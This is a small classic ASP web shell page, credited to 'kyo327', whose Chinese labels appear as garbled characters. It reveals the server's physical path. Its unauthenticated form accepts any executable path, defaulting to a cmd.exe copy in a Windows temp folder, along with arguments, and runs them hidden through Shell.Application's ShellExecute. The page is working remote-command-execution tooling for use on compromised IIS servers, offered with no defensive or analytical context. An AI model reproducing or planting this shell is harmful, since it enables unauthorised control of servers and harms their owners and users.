<center><%response.write "<font size=4 color=red>shellapplicationִ������ �޻���</font>" %> 
<BR>�������ڵ�����·���� 
<%response.write request.servervariables("APPL_PHYSICAL_PATH")%> </center>
<html><title>shellapplicationִ������ by kyo327 </title> 
<body><br/><center>
<form action="<%= Request.ServerVariables("URL") %>" method="POST"> 
<br>����·����<br/>
<input type=text name=text1 size=60 value="C:\windows\temp\Cookies\cmd.exe"> <br/>
������<br/><input type=text name=text2 size=60 value="<%=canshu%>"><br/> 
<input type=submit name=makelove value=����> 
</form> </center></body> </html> 
<% 
appnames = Request.Form("text1")
canshu = Request.Form("text2") 
if appnames<>"" then 
set kyoshell=createobject("shell.application")
kyoshell.ShellExecute appnames,canshu,"","open",0
response.write "<center>ִ�гɹ���</center>" 
end if 
%>
